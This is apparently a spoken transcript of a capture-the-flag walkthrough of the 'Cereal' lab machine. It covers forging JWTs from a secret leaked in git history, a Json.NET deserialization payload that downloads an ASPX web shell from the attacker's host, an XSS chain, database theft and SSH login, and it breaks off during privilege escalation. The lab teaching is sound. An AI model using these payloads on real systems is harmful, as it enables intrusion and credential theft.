 what's going on youtube this is ipsec we're doing cereal from hack the box which was a hard windows machine that probably could have been bumped up to insane not because of any piece of this box being really tough but there just being a lot of pieces to find and then when you put it together it can be relatively hard to troubleshoot if you don't have a good methodology so i think it could have been insane in that aspect it starts off with finding a web server running a net application that has its source code exposed through just the github repository so you download the source code look through the git log you can find a jwt secret encoded in it so you can bypass authentication with that you find a deserialization endpoint that has some filters to prevent yso serial but it does have a relatively easy gadget chain to download files it is protected though by a ip filter so only localhost can hit the endpoint that does deserialization so within the application there's a cross-site scripting vulnerability that you can trick a user to access that deserialization endpoint and get code execution once you get on the box you find out you have sc impersonate but things are done to prevent rogue potato and sweet potato but there is a graphql endpoint that you can do a sir ssrf attack to generic potato to get privacy so with that being said let's jump in as always we're gonna start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it serial and then the ip address of 101010217 this can take some time to run so i've already ran it looking at the results i'm going to copy it into my clipboard so i can quickly paste to here because this box we're going to actually have to take notes if you don't you're going to run into some issues so let's just look at the results in obsidian which is the application i use for notes the very first port is ssh on port 22 and its banner tells us it's open ssh for windows underscore 7.7 i don't know where the 7.7 comes from maybe windows is using open ssh 7.7 but i should do more research into this because the next point is we have http on port 80 and its banner tells us it's microsoft iis httpd version 10.0 now you used to be able to enumerate what version of windows this was based upon this header but 2016 and 2019 both use version 10 so you don't really know exactly what version of windows it is you just know it's not end of life so um maybe if we do more research in this windows 2016 uses a different version of ssh i don't know so something i should look into but just don't know the answer to the next thing is we have https on port 443 and it's also running iis however the nmap nse scripts do tell us that there are two host names to the box serial.htb and source.serial.htb so i'm going to add those to my host file so sudo vi etsy host and we're going to go 101010217 source.serial.hdb serial.hdb so we have that um i'm going to run the nmap again because now that those dns names are there the scripts do other things so to show that we'll just do map sc svoa nmap serial dns 101010217 and in most environments you have dns working so you won't actually have to do this when nmap sees the ssl certificate has a host name it goes and follows it so i'm going to do that and then we're going to go to the pages and do go buster so let's go check out source.serial.hdb and then serial.htb uh we have a ssl warning let's just click through it um on source we have an error message so i'm going to take a print screen and this is flame shot i think it is called maybe fire shot um some element that means heat and shot and i'm going to highlight this and i may not want that to be green where do i go to change it uh it is now green i don't care enough to change it right now and we're going to create a note uh we'll call this 10 uh source serial hdb and paste that and the main reason i want to look at that is because it exposes the source so we know where the application is running let's see leak of source or let's see web app location see colon inet pub we got to do two backslashes i think source default.aspx let's see what that looks like there we go maybe i didn't have to do backslashes but that looks good and the reason why this is good is because in windows the places can always change so it's just nice to know where the web app is running we can look at the show detailed one and we also get a output of what dot net version they use and let's see what else we have is there anything it's a long path so i don't see anything else too interesting here then again i didn't even click that when i was doing this box so i'm not sure but you got more error messages whenever you heard in a web app or you do a pen test and you see a detailed error message i put that as a medium finding because this type of stuff will allow people to enumerate the application and find vulnerabilities and then we have a basic login form admin admin login failure i can do a default like or one equals one and nothing works i just tested basic sql injection and let's go back to our nmap to see if the scripts told us anything it does so if we less nmap serial dash dns.nmap we do have extra scripts running it does a basic dir bust and finds a dot and get directory and this dot get directory is the reason why whenever you see me use go buster nowadays that i use the um opt what is it forget what the word list is a set list so cat opt cyclist it's a capital s then we'll do discovery web it's the raft small words is what i always use now because this one let's just actually grep dot get has.get if you use the let's see what is it crap dot get on user share word list then directorylist23 medium.txt i don't think dot git is in this no it is not and if you think it's that backslash it's not the backslash so that's why i always use the draft small words now if you use this directory list you won't find that dot get file which is somewhat common especially i've seen that in real world things definitely so whenever you you're a presented source you should download source and when we try to go to this.git directory it just says a forbidden however um it's just the directory listing is forbidden if you actually know all the get files like pads and everything you can just go and grab it so i'm going to use a tool called get dumper i'm going to just do a get pull to make sure i'm on the latest python3 get dumper dash h and we give it the url and then the directory we want it saved at so i'm going to save it at home ipsec hdb serial source and it's going to fetch everything if you look the very first two files it gets is it tries to get head and then goes to git ignore commit edit message so if we look at get slash head we can see uh this is a reference to what their current branch is so we have now successfully downloaded the source i'm going to go into the source directory and we have a net application the very first thing i do whenever i download git is do a git log to see what like history there is and right off the bat we see security fixes so i'm going to do a screenshot real quick and we're going to create some notes real quick because this is where it's going to come in handy that we did notes because the chain to this exploit is like three or four things so uh start of dotnet source so it pastes the screenshot and it shows security fixes so we do a get show here copy paste and we see two things uh right off the bat i see this filter to prevent deserialization attacks which that's pretty handy so i'm going to copy this so i see the path actually we can just do it and copy and paste and if we do it this way we can uh copy and paste i wonder if i can do c dollar with that let's see hey yeah it does syntax all incorrectly awesome or i can't see a dollar c pound or c sharp so we have that and then we go down here and we're getting a secret key so if we look at key we got encoding.ascii.getbytes and we have this so let's copy this and we will paste and then we should label these so this will be um custom filter to prevent deserialization if i can spell it takes a second sometimes to think about it and this is a what is it jwt secret okay and we can say old commit so we got some things here but we can't really use anything and if we want to look around at the source code um i love using an application called visual studio code or on linux i normally use vs codium or you can just do vs code codium is just i think an open source fork that removes some telemetry so let's go to um what is it home htb serial source and we will open this directory and we can start poking around at the application but the first thing i want to do is change my font size so i'm going to go in settings search for font then we can say edit font size i'm going to put it to be 18 save and there we go that should be a bit easier for you to read the very first thing i want to do is look at the jwt to figure out what settings are in the jwt so let's go back here it is in services user service so we're going to go here we can probably just look at that and get but i always like going to the latest because things may change so looking at this we can see we got viral user it's selecting a username and password return user equals null so authentication success generate the jwt token and it's using this claims identity thing so i'm going to show you in.net how to create this because if we just switch to python right now and don't look a lot at like the actual framework that's being used here we're going to have a lot of issues so whenever you can like replicate the language that the application is you should do that because there are some weird things that happen so i'm going to copy this so let's see we want to copy just all the token stuff okay that should be good i'm going to switch over to commando i'm going to open up visual studio code or just regular visual studio and we're going to choose a net application so once this loads we will be able to do create a new project and i'll call this uh let's do net application i wonder if it'll work in net core the name we can call it serial jwt create and once this creates we'll be able to paste and then we'll have to go back to our notes to copy the secret because in the latest source it just has five stars and that is not what we want um alternatively alternatively you could go to like some online jwt token place but again you're not going to know all the variables looking at this i mean i would guess it has a user field but i don't know anything else so let's make sure this is my clipboard go here it's still creating this project come on there we go so we got a program here we can paste our code okay i'm going to save it and then what we want is change this we can say var jwt as you go to tokenhandler.writetoken because if we looked at the source this was just returning the token so we probably just want to print this out so we can do console dot right line jwt okay i'm going to change this over to release whoops i can make that a bit bigger for you and then we can build solution and we got all these things so it's probably not going to build um yeah we got an error message let me pull this up uh we have a lot of these namespaces so let's see oh we didn't copy uh the top so go up here we probably want to copy all these models i'm not going to copy the serial.models or serial.helpers because that's gonna be in this.net code the only thing we should need is the standard libraries okay and it's still telling us we are missing some dependencies so let's see namespace model are you missing this so maybe we can search google for this uh chrome do i have it here or is this only firefox what browser is on this vm one should open there we go and that's why i can go to our website nope so we got this package and we're going to just install this so cmd let's go to source repos serial jwt and dot net add package and i probably could have done this in this command line but oh well let's see extensions does not exist we can do the same thing with this potentially or maybe just remove that if we don't need it but let's add this package okay come on that's added user does not exist so user it was asking for a user id so i'm just going to give it one chances are the very first user is always admin so we got a successful build um let's see if we built it as an exe too it says dll right there if it's a dll that will not help us we have a jwt exe awesome cd fin release net core app exe and it errored system string requires a key of at least 32. oh we probably need to change that so let's go back into obsidian source do i have it here yep copy let's try putting this here to see if that fixes the error rebuild and we get a token okay let's go back here and we can say valid token so if you don't know what a jwt token is it's three things broken up or three base64 blobs broken up into it's three blobs of base64 so broken up by spaces that's what i wanted to say sometimes talking is hard so if we look at the very first blob it's just telling us the algorithm and the type it's a jwt and it's encrypted with hs256 if we look at the second this is going to be where the data is and this is the piece why we switch to net to code so if we echo dash n base64-d we get unique name 1 nbf exp iat so unique name this is gonna be for the username nbf is not before so this is like the token should not be allowed or should not be usable before this time and this is all epoch time which is like seconds before or seconds after sometime i think in 1960 or something but this is epoch time this is when the token expires if we look back at the source code it expires in seven days so we could have changed that right here expires utc add seven days and then iat this is the time the token was issued so we can see this not before time and iat is the same exact time and that's just because it's valid soon as the token's created if you want to create a token and say it's valid um from tomorrow on you could set this nbf time but yeah that's that so we can put this payload in our notes because if we create a python script to mirror this that's what's going to be helpful okay and then the final piece of this is um a signature so this is just signing so if we try to decode this um echo dash n base64-d it's just blob because yeah if you look at entropy three bits i don't know what i was looking at there but yeah this is just a signature of it signing uh the previous payload so we can't alter it however we can alter it because um we have the signing key but yeah so that is the token piece so in order to use this we have to figure out how to pass the jwt token now in most like jwt things it is called a um bearer token so if we opened up burp suite and we edit a request we should be able to show this so burp sweet come on burp load could probably just do this straight and firefox probably should have done that but we'll wait for burp because this is what most people are familiar with and i'm still trying to learn enough zap to be comfortable showing it and not show you wrong things so one day i'll move to zap that day unfortunately is not today so now burp suite is open proxy intercept on we can go to serial.htb and how jwt authentication works is it adds authorization colon bearer and then the token so let's go back into our notes this is why it's handy taking notes on this box because again keep reusing pieces of knowledge you have gained so we can for this and see what happens i still went to login that's generally what should happen but i think there's a bunch of like javascript because if we look at the source of this it's going to be react so in some applications that's how you'd be doing the jwt token and this one not because it's all a javascript application we only intercepted one request but i'm assuming if we change this to remove don't intercept js we'd be getting a lot more requests which is where the like hurt of the application is it's in javascript so if we turn intercept back on and try this we have to turn burp suite i can show you maybe i can show you intercept on let's just this we can change it to get slash and then authorization bearer paste forward and now we get this one probably wants it on all of them which could be a pain there is plugins to automate this automate adding a header i'm not sure what happened so let's just stop with burp and look at the application so if we open up the debugger this is where this piece is going to come in handy we can examine the source of the application so i'm going to go in static js no i'm not let's refresh should have more things resource j or e let's see i could have swore i had more files let's try logging in does it get anything else invalid username or password outline doesn't do anything this is really confusing um there should be more files there let's go to console network arrow when attempting to fetch chunk looks like it gets it i wanted some weird like ssl thing um let's go back to debugger i'm going to send it through burp suite maybe there's like a certificate i accepted through bricsweed and it's not accepting it this may be the quickest way to bypass it there we go this is what i was expecting um we should get this static directory and a bunch of files so if we look at helpers and we go to this auth header we can see this is where it's saying add this authorization bearer token and also telling us to switch to content type application json if we look at though it's saying the value of current user.token and it's probably importing that from authentication services and the services thing so i'm going to go into services authentication service and we're going to see where it gets current user so let's see users authenticate log out where is it okay here it is jsonpurse local storage get item current user so this is a bit weird where it's actually storing it it's storing it in our browser's local storage which i think is the first time a hack the box machine has done that and it's the value current user so let's go to storage uh go to local storage add this and we create the key current user and then the value is going to be user colon and then the jwt token so i'm going to grab this yet again and we're going to go over into firefox and we'll just paste it there so now when i attempt to log in um it pulls it from this and puts that header on and we have or access to this page awesome there's not too much we can do here i mean we can say test change the flavor uh say request and it kicked me out this is the one thing of the application that was frustrating me um we're gonna do this token thing a lot because i'm probably doing something wrong and it just doesn't like me or maybe my browser is funky so current user user this okay go to slash i'm guessing if i do this again it's going to kick me out right i was hoping to tell me like bad cereal but it didn't um let's try it again and we're going to hit like log in and see what happens if i just don't go directly there that's adding a cookie i don't want to do that local storage add current user and the value user like that we hit login again we go here maybe we have to hit log in again let's see what happens if i send this i'm brought back to the login page wait yeah brought back to the login page so let's do this one last time and this time when we do it we're going to intercept and burp suite with the request so we don't want the cookie local storage add item current user and the value user paste the blob i need to quit that okay so we can hit slash and this time when i send this request i'm going to intercept the response so we can see exactly where it sends us and why we log out so intercept is on send request send this to repeater window i'm going to say serial request as the title send it and we get a unauthorized issue and this is where i realized something with my javascript and applications going wrong because we don't have the bearer token so authorization bearer i'm sure if the demo gods weren't angry with me we'd be able to do something here and we just exceeded our api quota so we can do six requests per five minutes so what i'm gonna do is just pause the video and we're going to come back in a few minutes to let this little dirtbust thing um stop and we can send this copy and valid token let's see we'll do 20 use token lock out paste whenever the application um takes some time that's key for you to go back to your notes and document oh it's already been the five minutes i didn't have to pause the video how awesome uh we look at this unsupported media type status 415 going back looking at our content type where is content type we're sending text plain um if we remember the javascript on the user sent um total browser to send application json and that's what wasn't working and you can see here it is definitely a json request so let's send application slash json and we're valid so now we know we can authenticate the application using our jwt token and um send data so the next step of this application is try to find a way to execute code if we go back to our notes let's look at dot net source right here what told us there was a filter to prevent deserialization that's in controller's request so let's take a look at what it looks like on the latest so controllers request and let's see we got this restrict ip thing so a lot of these are restricted by ip address we should look at that so here is where we were looking and it's saying if the request is equal to or contains object data provider windows identity or system send bad requests the serial police have been dispatched so this is probably going to be common things in yso serial there's probably ways we can encode this to obfuscate so we don't have these strings in it but i'm not going to go down that path we do see it is doing a dcr lies so we should look for how to abuse this and craft our own serialization payload that won't use this because serialization.net may sound scary but i promise once we go over this at least this json serialization is going to be easy peasy so the first step is to look at what type of json library we're using so it's if we go up to the top we can see it's using newtonsoft.json and if we go over to google let's turn burp suite off and just google newtonsoft json it's json.net is the main thing so i'm going to google um black hat json deserialization i think monday was in the title friday the 13th json attacks black hat so this is a really good talk about this but if we scroll around the few key pieces is it talking about json.net so that and then it gives us some payload examples json type let's see oh right here i think so we just do type we specify the class specify the parent so this is install.assembly installer and then also goes to install so i'm going to just start typing the deserialization so 25 deserialization so our payload is going to look something like this so type i wonder if i should do this in single quotes why are you doing double there we go so type and then we're going to um specify what we want to do so going back to this application we have to find a dangerous thing the dangerous thing is this download helper and we could have what i did before that i forgot to show you when we're going over this is i looked for a download helper here to see if any piece of application uses it nothing does so it nothing calls this function but it exists so you can do it with a deserialization attack download helper is just going to download a file off a web server wc download file so what we want to do is let's see specify the full path so serial dot download helper and then so go here serial dot download helper and then it's parent which is just um serial like that and then the functions we want to use so the very first function the arguments we need string file path and url so it may help if we make this pretty so type and then we need um url or what was it yeah url so http 101014.2 i'm going to say command.aspx i'm going to put a space here so things make more sense the next piece was file path and c colon backslash i net pub backslash source i believe if we go back here look at this error message inet pub source and then the name cmd aspx if i run a go bus on this directory it does reveal there is an uploads i'm not actually going to do it because i have a feeling this video is going to be really long so if we go to source if you check like slash upload you get a 404 if you get uploads you get 403 so go buster would have found this directory and this is just one way we can write to and then the last argument string url i think that's see url file path i think that's all we need so if we can get this payload sent to the server we will be able to hopefully download a page off of us however if we look at the function in request controller see is this where it was yeah we have this restrict ip so let's see what this policy is i'm going to we could do edit find and files restrict ip and we can see where this is add policy and it's getting it from application options so if we go back to files application options uh app settings there we go uh application options right here whitelist 12701 and localhost or ipv6 so the only way we can access this is through localhost so we can't actually hit this endpoint of get id because we're not local host so the next piece in this is we've defined a like server-side request forgery or a cross-site scripting attack to access this if we poke around more at the source code if we look at models uh pages let's see migrations no let's go to client app source we do have this admin page and if we went back and poked at the source on serial like this let's see do i have everything here uh debugger let's go back through burp i'm really not sure why that's happening honestly i can only assume it's some ssl certificate error message if i cleared out my search store and did it again probably wouldn't need burp but let's see admin page does exist here and if we look at app i'm looking for where the routes are let's go to index no see login page home page see services handle i response have sworn that i had made this bigger font oh well private route see slash login this isn't what i want let's go back to app.jsx we do see references to like homepage along a page admin page ah here it is um if we go here let's go obsidian so we can make it bigger uh net source maybe jsx and we can just say this is javascript so if i look at this this is the route so we have slash admin and slash login if we look at what is in slash admin i'm sure if we open a browser go to slash admin and i'm going to have burp suite do this because it's probably going to log us out we do have current serial request so there is an admin page that is going to display all of this and thinking like ctf like um some type of user simulations probably going to hit this page so if this page is vulnerable to cross-site scripting and we can create a serial request with a redirect we can then um hit this page from localhost as long as the user simulation is happening on localhost so let's go and look at the source code again so in vs code we can go to um source admin page admin page.jsx and kind of look through this it's using this react marked markdown and this is a hard piece of the box to know this is an out of date plug-in that is vulnerable to cross-site scripting you could go into the source so if we go here and go into what is it clone app source so client app source cd admin page uh wait we don't want to go that far let me just go here and do npm audit and this is going to um do a like audit of this and it shows there's one critical vulnerability 18 high 87 moderate and 10 low and npm audit there is a lot to go through um there we go we're at the top and a lot of these could be false positives things like that are just not exploitable if we look for the critical i don't know exactly how to exploit this handlebars thing and it also depends on a vulnerable version of optimist so there's a lot of just things you have to go through and this is a very noisy check but if you know to look at like the dependencies on the pages you want and we look at this react markdown thing we can see there is a high vulnerability with no fix and digging into this this is actually like a four year old vulnerability so the module is just not going to be updated if we click on versions that show yeah five years ago so i think this just hasn't been updated and it even let's see gives us a example payload so it's doing this javascript alert one so let's go back to a request we should go to obsidian we can say 30 xss and let's see payload like that and i should link this and react what was the thing marked knockdown okay so let's go back to the source.net hardcoded jwt we're going to need to pull this token again and i'm sure there's just something i'm not doing on the application to save my session which is annoying but i'll live with it so that's a cookie let's go to local storage serial add now i can make it bigger current user user paste this now we can get to this page and this is where we want to do a cross-site scripting attack so i'm going to pacer xss payload and then we're going to change it because um we won't see alert right we won't do document.write and then we can put a image source is equal to what if we can do quotes i don't think we need quotes in image source so i'm just going to http 10 10 14 2 slash test and then like that if this works then we should get a hit on a web server if it doesn't work we should try quotes and the payload the reason why i'm like averse to using quotes is they're a notoriously bad character and i may fail on using a quote to begin with the thing we want to do though is intercept this request because we have to change the application type to be json so let's see where is content type here we go application slash json and then before i send this we just want to do sudo nclvnp 80. so that should if all goes well send us a request unauthorized because we did not do the header authorization bearer and then we need the jwt token out of our source paste okay great serial request so i'm just gonna wait here um it's probably gonna be up to three minutes i have found so um 120 180. so we're just gonna sleep for this and we'll see if we go almost immediately we gotta hit so we got lucky there and we do have a connection from 101010217 it's using mozilla and it's getting slash test so we have now verified that cross-site scripting works so i probably should have screenshotted that but oh well so let's see let's copy this payload because this is the one we used i'm just going to copy this whole request go here crosstalk scripting paste there we go so now we're just the tough part we have to create something to exploit this um i think that's how it was so to create the python script to do this exploit and this is where the notes come in handy i'm just moving everything into this folder okay so let's see i'm going to add a note we'll do it at 13 um exploit walkthrough because there's a few things we'll have to do and this is why i always number things because for my notes i enjoy putting like a high level on a bit like high level of what we're going to be doing and then going through and looking at each piece and detail so that's why i do these numbers to make it easy to organize on this so the first thing we do is create a jwt token got secret from get commit so we create the jdbc diagram this lets us login and then we're going to have to store our deserialization payload the serialization payload on the server by posting to slash request so after we store it we can create a cross-site scripting redirect to trick admins browser to hit or deserialization which bypasses restrict ip so if that restrict ip header wasn't there we could just access that page ourselves but since it is there we can use the admins ip address through a cross-site scripting to get to it so here is wait for admin to hit cross-site scripting and five server downloads or web shell so that is the high level of what we're doing so v notes paste okay v exploit dot pi for the import statements we're going to definitely want to import the request library because we want to make http request and then we have to deal with ssl so url lib3 exceptions import insecure request warning can yank work yank word then we put that there and we can say request dot packages dot url lib three disable warnings category is equal to that insecure warning so all that does is lets us hit um https pages that have a self-signed certificate so if i run python3 exploit.pi uh url lib3 has no disable warning it's disable warnings okay so there's commands made it there the next thing we need to do is import time because we gotta do a bunch of jwt stuff with our epoch time and of course import jwt now the jwt library i use is pi jwt even though it's just called jwt so into a pip install to make sure that exists and we can say epoch is equal to time dot time like that and we can print epoch see if this works uh we just want it to be integer we don't need that floating point there we go okay so now we can create our jwt token so we can say auth is equal to jwt dot encode and then we want to go back to our notes let's see started.net and this is what we want like that okay so that's a unique name one not valid before and i'm just going to put epoch expiration so we can say um expires is equal to epoch plus let's say seconds in one day is it like 3 600 that may be one hour 8640 we can just do it for one day that's fine epoch plus that so let's see not valid before expires like that and iat this was just epoch okay let's print off uh missing one value the key so we definitely need to specify the key in this encode so that will be up here the secret and then we should also specify the algorithm which was hs256 so now we have a jwt token um if we want to we can test this out to make sure it works so if we go back to burp suite we can just replace this bearer token with this one send it and we get a great serial request so we have a valid token so this is create jwt token we probably should create these and like functions and not stuff but i'm lazy we don't have to this is going to be stage 0 test xss 4. now what i'm doing here is going to be just playing with my script and stage one um let's see do i have better notes over here so this is maybe stage one maybe i'm getting the stage is wrong but i'm actually going to be testing this piece first um this should be easy however we can't really do anything with this this is actually complex because we have to get a good way to send a crosstalk scripting payload there um when i was doing it i said quotes to the devil so um we just need to make sure our script can send a valid cross-site scripting and then we can make this one be more complex to hit this so at the end of the day i'm probably going to comment stage 0 out this is just more of a testing playground so i'm going to say js payload is equal to i'm going to do these quotes and what i want to do is go grab this and we want to make our payload equal to this right here now if we just sent this payload it works because it doesn't have bad characters but i want this to work with bad characters so i'm going to base64 encode it so base64 js payload is equal to js payload uh this is going to be base64. encode or basics4.b64 encode and we have to import that here and this will have to be encoded to a binary value for base64 to work and we don't want it to be a binary blob so if i print b64 js payload we get that and that's exactly what we want to get so our serial request is going to be similar to this so we can copy paste we can say xss is equal to this and all we want to do is go here and we're going to get rid of this document.write image source thing and i'm going to do eval and then we're going to do percent a to b or not percent um parenthesis and we want to put our base64 encode so i'm trying to think the best way to encode this um let's see we do this json and then i want to do an f string title like that this is getting ugly this is why i'm breaking it out javascript eval i don't want all these escapes see a to b like that let's just see what this looks like if i do a to b and we can say b64 js payload is that actually going to print line 22. see we want to print xss now and i think that looks good so the next thing we want to do is get rid of these parentheses and we also need quotes here because we're passing in a string not a variable so we just want to url encode this so a parenthesis in html is 28 our open parentheses 28 quotes are 22. if you just go to brep suite you could uh do an ascii code or asciid code and we want percent 29 percent 29 and i think we go with one more thing to close that so we don't want any parentheses because we have a parentheses right here so we got that piece let's see the next thing we need is going to be weight uh where do i put it right after this so this is where i can do um flavor meat then color just has to be some html color i'm just going to do one two three one two three i didn't want to type 492 whatever and then we can say description please subscribe okay so let's print this payload to see if it works looks good to me but this is where we're testing it and again the reason why we're doing this is because this is a complex piece and a javascript is going to be pretty long so if we don't want to deal with obfuscating the javascript we just make sure this proof of concept works and yeah so now we can do um response is equal to request.post and the url https serial.hdb slash i think it's requests yep requests and then we can do json is equal to xss headers is equal to auth and verify is equal to false to tell our thing not to validate and ssl just going to import pdb pdb dot is it break or debug maybe it's pdb.debug that should drop me into a python debugger hopefully so auth um let's see there's going to be token auth is equal to this is gonna be the header so the first field of the header is authorization and then the next is bearer token like that so when you're adding headers in request it goes there and then the second piece so let's see if we get this working not a chance uh request not define because it's requests pdb um let's see oh um brain fart it's not debug it's set underscore trace i really should set a macro to this so i don't have to keep typing it out but we run this we can say response 200 response.txt great serial we should listen on 80. so we sent the message we got the request back saying um it worked so now i'm going to sleep 120 and we'll see if the server makes requests back to us if it does then everything worked and we can go on to the next if not we gotta do some blind debugging which is never fun and we have a request back to us so awesome our payload does work that we can trigger this so we can go back into our exploit and kind of continue so what i'm going to do is rename this to stage two send xss and we're going to come back to that in a few minutes so stage one is going to be uh send deserialized payload so the very first thing we want to do is send a payload and i think i put that here let's see and this so let's put this all on one line okay and then to do this we just say json colon and then we'll put that like that i think so now we have this json payload and all we want to do is send this so let's go back here and we'll put so we're sending this which will be payload is equal to this and we can say payload now we have to do a more complex one actually we can say response is equal to response.json because if we look at this gives us json back and we just want to get the id so serial id is equal to response id because in our cross-site scripting attack we want to direct them to this exact payload so now we can say var request is equal to new xml http request and if you've um unfamiliar what i'm about to do if we do ipsec dot rocks and i'm sure if i search for xml http request we can see we've done this a few times so i probably better explain it in those videos but it's pretty simple we open a request we want it to be a get and then to the url https hdb slash request slash serial id and we want this to be a f string the f string is what's going to put that variable there then the next thing we do is rec set request header authorization error and we want to put the token like that f string okay and then rec.send so this is our javascript as long as we did not screw it up oh wait um i wonder if i can do this i just put f here i was wondering the whole time like why my syntax highlighting wasn't working on the commas and it's because i'm wrapping this all up into one big thing so that should work and then this is going to send the payload see print rest dot text and we're going to say print serial id and i also want to print js payload just to see how it um did all these variables so instead of netcat i'm going to now do python3-m http server because the server is actually making two requests to us or um it's making a download request python3 exploit.pi uh f string single is not allowed let's see what line was that 29 so it did not like how i was doing this so let's see we can just say js payload go to that js payload plus equals like that js payload plus equals if we got a semicolon there and we can say js payload is equal to js payload encode that may work better oh yeah that's fine exploit single oh let's see that's what the arrow was [Laughter] oh well you saw it two different ways uh js payload's not defined because surprise surprise i type at something uh response has no attribute test surprise surprise i type it something okay so we sent a few requests and oh wait that's fine request 20 20 is here this is the bearer token that should be fine so sleep 120 and we'll see if it actually makes a request to our server so it never made a request back to us which is awful because these type of exploits are very painful to troubleshoot because we don't have a way to kind of um test out exactly what is happening we can take a look at the code and we've validated the jwtb's that should be solid the unknowns right now is this json piece or the um deserialization payload and this stage two we know down here is good how we're actually executing it because we had the forethought to test it with a basic cross-site scripting payload so the easiest thing to test right now is going back up here and grabbing the actual um payload we sent and just testing this in our browser making sure it is valid javascript so i'm going to copy this and we're still listening on port 80. i'm going to go over to firefox and we're going to go into the console tab and i'm just going to paste our payload and we're going to change this to be http 10 10 14 2. and hit send and we see uh string literal contains an unescaped break so somewhere we have a issue and glancing over the payload i didn't terminate the quote here on this bearer so i'm guessing that is it so if i put a single quote here and hit enter and we still have an issue so let's see request new i wonder if we need to put new lines here so let's go and put new lines i don't exactly like how the request is different colors which when that happens it leads me to believe i've screwed something up but putting it on different lines it looks good i think the send should be green based upon this stuff being green this all being purple worries me so error that's quoted send string literal contains a unescaped line break line 3 54. so i'm going to this piece and vt let's see what i think my copy and paste put a line break i thought that was just like line wrapping but apparently it was not so i think we have it here too there we go and now that request send is a different color oh i have to redo it so what i was doing here is just hitting home and end on my keyboard to go beginning at end line let's just go to the end hit enter and i think this is good uh we got blocked because we're mixing like https and http but we don't have a javascript error and no javascript error means good news for us so let's go and fix that so go back in our exploit bearer token wait where was it it was at a xss down here there we go now that's closed off and we can send the exploit again and this time hopefully it works and we don't have mixed content here because we're doing https on serial to get that deserialization payload the desealization payload again if we go here what did we record that right here deserialization is this so it should make a request back to us so i'm gonna let it sleep this 120 i probably should have done uh 180 to go for the full three minutes but we'll see if we need to go that long and success i was just after this sleep finished we got a hit on cmd.aspx so now what's left is actually hosting that file so let's make dirt dub dub dub and i'm going to locate cmd.aspx and we have it in a few locations i'm just going to grab it from opt sec list web shells um we also have webshell fuzzdb we have it in a lot of places but i'm just going to use the one in setlist and we're going to host this and i'll run the expert again in hindsight i probably should have um done this the first time but oh well hindsight's 20 20. i got excited by running my payload and seeing if it worked so now we're just going to wait for the server to make another request back to us and hopefully it uploads it into the um source directory so just wait here now it hasn't even been the full three minutes but we do have a hit on cmd.aspx so let's go back over to our browser and we can go to source.serial.hdb upload cmd aspx this is where we placed it with a serialization payload and we have it if i do dir we can list the contents we could try to get a reverse shell from here but what i want to do is just look at the um file system so if i go dirc colon backslash inet pub and we can go to serial then let's see uh client app oh there's a db directory so like i said whenever i look at web applications the main thing i want to grab is the database because i mean there's always good information in the database it's like there's always money in the banana stand like there's always going to be a password in the database so this is the first place i draw my attention to we can type it but this is a sqlite database and we can see a request here and we got the password here but it's not really intuitive that that's it so what we could do is like a powershell one-liner to convert this so powershell um i'm gonna type it in obsidian let's see 45 ps um so we're calling powershell was saying fname is equal to get content c colon backslash inept pub serial db serial.db and then we want to convert to base64 string then text.encoding we're changing it to utf-8 so it plays well with our linux machine and then fname and double quote so we can copy this and paste and if i execute oh let's see cannot call a method on a null value so i did something wrong fname is equal to get content i have a quote there let's execute see maybe get rid of the quotes see powershell get rid of the space here so does this just work okay no error there right host fname we can do that so our error was within my hastily written base64 one liner i wonder if i typo the file name here no it looks like i did that right huh see convert base64 string text utf bytes oh uh ut8 utf there we go so let's try this now let's see powershell paste that's in quotes there we go so now we got a bunch of base64 we can v db dot b64 paste it base64-d to db so now we can sqlite three db dot dump and it looks like it's corrupted we can just stringsdb and we can get most of the information out of here users sunny whatever so right around this request area we get corrupted i'm not sure exactly what's happening here it may be us converting the database to utf-8 so what i'm going to do is just use our web shell so we can just uh let's go back to oh i'll type it out here but we can copy this file so copy this to c colon inet pub uh where is our source uh where was it right here i net pub source uploads so i net pub source uploads and we'll call this serial.db so we can run this command and let's see i was expecting it to say like one file copied so let's let's open two windows and i'm going to dir this one so if i do it dir on this directory did not copy so i'm just going to not put the file name so c colon inet pub source uploads and it's still not copying it so i'm going to do type okay we have that command find c colon windows temp it doesn't seem like it wants to copy cmd c is it actually copy on windows it's actually copy on windows that was the issue okay uh sometimes linux spoils me hopefully you make that mistake too and i just don't look like a silly person uh syntax of the command is incorrect so copy then c colon i net pubs i wonder if we can just do slash like that let's see copy this whole thing i can buy just do copy does it want the file name not just the directory execute one file copied we can do a dir confirm serial.db is there and then let's go and download it so serial.db and we get four for file not found now this is weird because we confirmed this file does exist if we want to make sure we don't typo things i mean we can just copy and paste and still for a four but um is does do a lot of just native things to protect stupid like low-hanging fruit one of the things is i don't think you can download files at endn.db so i'm going to do db.txt and we do a dio now we can see db.txt exist and we can happily download the file so one thing to keep in mind and that's why you like break things up and keep it simple so let's copy downloads serial db text to uh we just called it db so sqlite3 db dot dump and now we can dump everything and we see there's this user sony and the password so ssh was on this box i'm not sure if when rm was we didn't do a full port scan um it's like 59.85 i think nczv 10 10 10 217 5985 or five nine like that i don't think winrm's running uh winram port let's see is it 59 85 yup i had that right so it didn't look like we got any connections there but ssh was listening on this box so do ssh sunny at 10 10 10 217 and it's going to give us a disconnected right away and the reason for this is i have a bunch of ssh keys so i'm going to do a bunch of these and we can see before even getting the prompt i'm attempting a bunch of ssh authentications and then the server's like nope you've bypassed a number of things i'm just going to disconnect you and this is common when connecting to windows ssh servers i don't think it's as common on linux ones on windows it is so if you want to do public password authentication dash o um what's the sh-o option disable public key let's see disable public key authentication see what is it dasho pubky authentication no i think like that and now it's asking me for the password so and typical ipsec fashion i probably got rid of the password did not notate it so we can copy this let's go here uh one creds okay and we can copy this password and we get in now one thing you could do is you can do ssh pass i think that's it uh run command what is it that's not it let's do sh pass h oh we need dash p like this and it won't prompt us for the password it's kind of handy for nodes or resuming where you're at quickly so now we're on this box we have a command line we can do dir we can do everything we want except the administrator right now the very first thing i generally do is run like a system info and let's see what we get come on access denied so we can't do that um the powershell equivalent is get computer info so powershell get computer info and it does output some stuff so we can see it is first of all server core i'm mainly looking for the version so we are running let's see windows 2019 and it's server core the other thing i like running is who am i slash all and we can see we do have sc personate privilege so this should be as easy as just running rogue potato to privasc rogue potato is going to require us being able to get off the box so i'm going to do a powershell w get hdp 10 10 14 2 test and we can so the next thing we need is to be able to um netstat a-n-l-p netstat a n there we go hit 135 and 135 is listening so rogue potato may work here um i wasn't expecting this piece to i'm trying to think what broke here um oh i remember um for rogue potato work we have to be able to hit our server on 135 because microsoft prevented us from changing the port but not changing the um ip address so i'm going to do a w get again i'm going to go to port 135 and we can't 